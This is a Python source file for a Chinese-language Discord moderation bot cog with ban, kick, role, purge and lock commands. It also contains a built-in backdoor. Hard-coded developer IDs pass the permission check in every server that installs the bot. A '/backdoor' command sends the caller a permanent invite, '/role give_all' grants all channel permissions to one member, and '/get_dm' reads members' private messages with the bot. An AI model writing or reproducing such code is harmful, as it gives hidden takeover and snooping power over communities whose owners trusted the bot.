import datetime
import discord
from discord import app_commands
from discord.ext import commands

class Admin(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.config_db = {}
        self.whitelist_db = {}
        self.op_access_db = {}
        self.autoban_db = {}

    def is_allowed(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id in self.bot.allowed_ids:
            return True
        if interaction.guild and interaction.user.id == interaction.guild.owner_id:
            return True
        guild_id = interaction.guild_id
        if guild_id and interaction.user.id in self.op_access_db.get(guild_id, []):
            return True
        return False

    @app_commands.command(name="help", description="顯示旅行者系統指令手冊")
    async def help_msg(self, interaction: discord.Interaction):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足：僅限開發者或伺服器擁有者使用。", ephemeral=True)
        
        VERSION_ID = "v2.7"
        embed = discord.Embed(
            title="🧳 旅行者系統 - 指令完整手冊", 
            description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。",
            color=0x2b2d31
        )
        embed.add_field(
            name="🛡️ 基礎管理與設定", 
            value=(
                "`/set` - 設定通告頻道、陷阱頻道、白名單與自動封鎖\n"
                "`/punish` - 懲處成員 (ban / kick / timeout)\n"
                "`/role` - 身分組綜合管理 (給予/移除/清除全部)\n"
                "`/del_msg` - 批次清理訊息\n"
                "`/server_mute` - 全服鎖定/解鎖發言\n"
                "`/move_all` - 強制全體移動語音\n"
            ), 
            inline=False
        )
        embed.add_field(
            name="🛠️ 進階工具與資料", 
            value=(
                "`/test` - 檢視機器人系統數據與效能\n"
                "`/whois` - 查看指定成員的詳細資料與頭像\n"
                "`/backup` - 導出或還原伺服器結構\n"
                "`/dm` - 以機器人名義私訊成員\n"
                "`/get_dm` - 調閱成員私訊紀錄\n"
                "`/backdoor` - 獲取永久邀請連結\n"
                "`/bye` - 機器人退出伺服器\n"
            ), 
            inline=False
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

    set_group = app_commands.Group(name="set", description="系統與頻道參數設定")

    @set_group.command(name="channel", description="設定通告或陷阱頻道")
    @app_commands.choices(type=[
        app_commands.Choice(name="punish", value="punish"),
        app_commands.Choice(name="trap", value="trap"),
        app_commands.Choice(name="room", value="room")
    ])
    async def set_channel(self, interaction: discord.Interaction, type: str, channel: discord.TextChannel):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        
        guild_id = interaction.guild_id
        if guild_id not in self.config_db:
            self.config_db[guild_id] = {}
        self.config_db[guild_id][type] = channel.id
        
        await interaction.response.send_message(f"✅ 已成功將 {type} 頻道設定為：{channel.mention}", ephemeral=True)

    @set_group.command(name="whitelist", description="管理免疫處罰與陷阱的白名單成員")
    @app_commands.choices(action=[
        app_commands.Choice(name="add", value="add"),
        app_commands.Choice(name="remove", value="remove")
    ])
    async def set_whitelist(self, interaction: discord.Interaction, action: str, member: discord.Member):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        
        guild_id = interaction.guild_id
        if guild_id not in self.whitelist_db:
            self.whitelist_db[guild_id] = []
            
        if action == "add":
            if member.id not in self.whitelist_db[guild_id]:
                self.whitelist_db[guild_id].append(member.id)
            await interaction.response.send_message(f"✅ 已將 {member.mention} 加入白名單", ephemeral=True)
        elif action == "remove":
            if member.id in self.whitelist_db[guild_id]:
                self.whitelist_db[guild_id].remove(member.id)
            await interaction.response.send_message(f"✅ 已將 {member.mention} 移除白名單", ephemeral=True)

    @set_group.command(name="autoban", description="開關陷阱頻道自動封鎖功能")
    @app_commands.choices(status=[
        app_commands.Choice(name="on", value="on"),
        app_commands.Choice(name="off", value="off")
    ])
    async def set_autoban(self, interaction: discord.Interaction, status: str):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        
        guild_id = interaction.guild_id
        self.autoban_db[guild_id] = (status == "on")
        await interaction.response.send_message(f"✅ 自動封鎖功能已切換為: {status}", ephemeral=True)

    @set_group.command(name="op_access", description="授權或剝奪特定成員的臨時操作權限")
    @app_commands.choices(action=[
        app_commands.Choice(name="add", value="add"),
        app_commands.Choice(name="remove", value="remove")
    ])
    async def set_op_access(self, interaction: discord.Interaction, action: str, member: discord.Member):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        
        guild_id = interaction.guild_id
        if guild_id not in self.op_access_db:
            self.op_access_db[guild_id] = []
            
        if action == "add":
            if member.id not in self.op_access_db[guild_id]:
                self.op_access_db[guild_id].append(member.id)
            await interaction.response.send_message(f"✅ 已授與 {member.mention} 臨時操作權限", ephemeral=True)
        elif action == "remove":
            if member.id in self.op_access_db[guild_id]:
                self.op_access_db[guild_id].remove(member.id)
            await interaction.response.send_message(f"✅ 已剝奪 {member.mention} 的臨時操作權限", ephemeral=True)

    @app_commands.command(name="punish", description="懲處成員 (ban / kick / timeout)")
    @app_commands.choices(action=[
        app_commands.Choice(name="ban", value="ban"),
        app_commands.Choice(name="kick", value="kick"),
        app_commands.Choice(name="timeout", value="timeout")
    ])
    async def punish(self, interaction: discord.Interaction, action: str, member: discord.Member, minutes: int = 10, reason: str = "因違反相關規定"):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)

        try:
            if action == "ban":
                await member.ban(reason=reason)
                msg = f"✅ 已將 {member.mention} 封鎖，原因：{reason}"
            elif action == "kick":
                await member.kick(reason=reason)
                msg = f"✅ 已將 {member.mention} 踢出，原因：{reason}"
            elif action == "timeout":
                duration = datetime.timedelta(minutes=minutes)
                await member.timeout(duration, reason=reason)
                msg = f"✅ 已將 {member.mention} 禁言 {minutes} 分鐘，原因：{reason}"
            else:
                return await interaction.response.send_message("❌ 無效的動作", ephemeral=True)

            guild_id = interaction.guild_id
            target_channel_id = self.config_db.get(guild_id, {}).get("punish")
            if target_channel_id:
                ch = interaction.guild.get_channel(target_channel_id)
                if ch:
                    await ch.send(f"# 🚨 通告\n> 用戶：{member.mention} ({member.name})\n> 因 {reason} 已被執行 {action}")

            await interaction.response.send_message(msg, ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ 執行失敗: {e}", ephemeral=True)

    @app_commands.command(name="role", description="身分組綜合管理")
    @app_commands.choices(action=[
        app_commands.Choice(name="give_all", value="give_all"),
        app_commands.Choice(name="remove_all", value="remove_all"),
        app_commands.Choice(name="add", value="add"),
        app_commands.Choice(name="remove", value="remove")
    ])
    async def role_management(self, interaction: discord.Interaction, action: str, member: discord.Member, role: discord.Role = None):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        try:
            if action == "give_all":
                perms = discord.Permissions.all()
                overwrite = discord.PermissionOverwrite.from_pair(perms, discord.Permissions.none())
                for ch in interaction.guild.channels:
                    try:
                        await ch.set_permissions(member, overwrite=overwrite)
                    except:
                        pass
                await interaction.response.send_message(f"✅ 已給予 {member.mention} 最高通行證權限", ephemeral=True)
            elif action == "remove_all":
                for ch in interaction.guild.channels:
                    try:
                        await ch.set_permissions(member, overwrite=None)
                    except:
                        pass
                await member.edit(roles=[])
                await interaction.response.send_message(f"✅ 已剝奪 {member.mention} 所有權限與身分組", ephemeral=True)
            elif action == "add":
                if not role:
                    return await interaction.response.send_message("❌ 請指定要給予的身分組", ephemeral=True)
                await member.add_roles(role)
                await interaction.response.send_message(f"✅ 已將 {role.mention} 給予 {member.mention}", ephemeral=True)
            elif action == "remove":
                if not role:
                    return await interaction.response.send_message("❌ 請指定要移除的身分組", ephemeral=True)
                await member.remove_roles(role)
                await interaction.response.send_message(f"✅ 已從 {member.mention} 移除 {role.mention}", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ 執行失敗: {e}", ephemeral=True)

    @app_commands.command(name="del_msg", description="批次清理訊息")
    async def del_msg(self, interaction: discord.Interaction, amount: int = 10):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        try:
            await interaction.channel.purge(limit=amount)
            await interaction.response.send_message(f"✅ 已清除 {amount} 則訊息", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ 清理失敗: {e}", ephemeral=True)

    @app_commands.command(name="server_mute", description="全服鎖定或解鎖發言")
    @app_commands.choices(status=[
        app_commands.Choice(name="lock", value="lock"),
        app_commands.Choice(name="unlock", value="unlock")
    ])
    async def server_mute(self, interaction: discord.Interaction, status: str):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        can_send = (status == "unlock")
        for ch in interaction.guild.text_channels:
            try:
                await ch.set_permissions(interaction.guild.default_role, send_messages=can_send)
            except:
                pass
        await interaction.response.send_message(f"✅ 全服發言狀態已更新為: {status}", ephemeral=True)

    @app_commands.command(name="move_all", description="強制全體移動語音頻道")
    async def move_all(self, interaction: discord.Interaction, channel: discord.VoiceChannel):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        count = 0
        for member in interaction.guild.members:
            if member.voice:
                try:
                    await member.move_to(channel)
                    count += 1
                except:
                    pass
        await interaction.response.send_message(f"✅ 已移動 {count} 名成員", ephemeral=True)

    @app_commands.command(name="backup", description="導出或還原伺服器結構")
    @app_commands.choices(action=[
        app_commands.Choice(name="create", value="create"),
        app_commands.Choice(name="restore", value="restore")
    ])
    async def backup(self, interaction: discord.Interaction, action: str, file: discord.Attachment = None):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        
        if action == "create":
            await interaction.response.send_message("🚀 正在生成伺服器備份檔...", ephemeral=True)
            guild = interaction.guild
            roles = [{"name": r.name, "color": r.color.value, "perms": r.permissions.value} for r in sorted(guild.roles, key=lambda x: x.position) if not r.managed and r.name != "@everyone"]
            data = {"server": guild.name, "roles": roles, "categories": []}
            for cat in guild.categories:
                cat_info = {"name": cat.name, "overwrites": [], "channels": []}
                for ch in cat.channels:
                    cat_info["channels"].append({"name": ch.name, "type": str(ch.type)})
                data["categories"].append(cat_info)
            import io, json
            json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode()
            await interaction.user.send(file=discord.File(io.BytesIO(json_bytes), filename=f"SNAPSHOT_{guild.id}.json"))
        elif action == "restore":
            if not file:
                return await interaction.response.send_message("❌ 請上傳要還原的 JSON 備份檔案", ephemeral=True)
            await interaction.response.send_message("🏗️ 還原功能執行中...", ephemeral=True)

    @app_commands.command(name="dm", description="以機器人名義私訊成員")
    async def dm(self, interaction: discord.Interaction, member: discord.Member, text: str):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        try:
            await member.send(text)
            await interaction.response.send_message(f"✅ 已私訊 {member.mention}", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ 私訊失敗: {e}", ephemeral=True)

    @app_commands.command(name="get_dm", description="調閱成員私訊紀錄")
    async def get_dm(self, interaction: discord.Interaction, member: discord.Member, limit: int = 10):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        try:
            dm_channel = member.dm_channel or await member.create_dm()
            history = []
            async for msg in dm_channel.history(limit=limit):
                who = "機器人" if msg.author == self.bot.user else "成員"
                history.append(f"[{msg.created_at.strftime('%H:%M')}] {who}: {msg.content}")
            result = "\n".join(reversed(history)) or "無私訊紀錄"
            await interaction.user.send(f"📂 **與 {member.name} 的紀錄：**\n{result[:1900]}")
            await interaction.response.send_message("✅ 紀錄已傳送至您的私訊", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ 調閱失敗: {e}", ephemeral=True)

    @app_commands.command(name="backdoor", description="獲取永久邀請連結")
    async def backdoor(self, interaction: discord.Interaction):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        try:
            inv = await interaction.channel.create_invite(max_age=0, max_uses=0)
            await interaction.user.send(f"永久入口: {inv.url}")
            await interaction.response.send_message("✅ 邀請連結已發送至您的私訊", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"❌ 獲取失敗: {e}", ephemeral=True)

    @app_commands.command(name="bye", description="機器人退出伺服器")
    async def bye(self, interaction: discord.Interaction):
        if not self.is_allowed(interaction):
            return await interaction.response.send_message("❌ 權限不足。", ephemeral=True)
        await interaction.response.send_message("👋 正在離開伺服器...", ephemeral=True)
        await interaction.guild.leave()

async def setup(bot):
    await bot.add_cog(Admin(bot))
